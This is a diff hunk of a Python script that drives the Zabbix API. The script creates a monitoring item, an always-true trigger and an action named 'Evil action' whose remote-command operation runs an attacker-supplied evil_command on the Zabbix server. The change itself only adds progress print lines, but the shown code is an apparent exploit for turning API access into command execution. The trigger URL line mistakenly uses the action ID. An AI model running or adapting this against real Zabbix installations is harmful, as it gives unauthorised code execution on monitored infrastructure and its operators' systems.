@@ -49,12 +49,15 @@ if __name__ == "__main__":
     print("Connected to Zabbix API Version {}".format(zapi.api_version()))
 
     try:
+        print("Creating item: Example item")
         zapi.item.create(name="Example item", key_="icmpping[]", hostid=1, type=3, interfaceid=1, value_type=0, delay="30s")
 
+        print("Creating action: Evil action")
         action = zapi.action.create(name="Evil action", status=1, eventsource=0, esc_period="1h", operations=[{"operationtype": 1, "opcommand": {"type": 0, "execute_on": 1, "command": evil_command}, "opcommand_hst": [{"hostid": "0"}]}])
         action_id = int(action["actionids"][0])
         action_url = urllib.parse.urljoin(args.url, f"actionconf.php?form=update&actionid={action_id}")
 
+        print("Creating trigger: Example trigger")
         trigger = zapi.trigger.create(description="Example trigger", status=1, expression="{Host:icmpping[].last()}={Host:icmpping[].last()}")
         trigger_id = int(trigger["triggerids"][0])
         trigger_url = urllib.parse.urljoin(args.url, f"triggers.php?form=update&triggerid={action_id}")
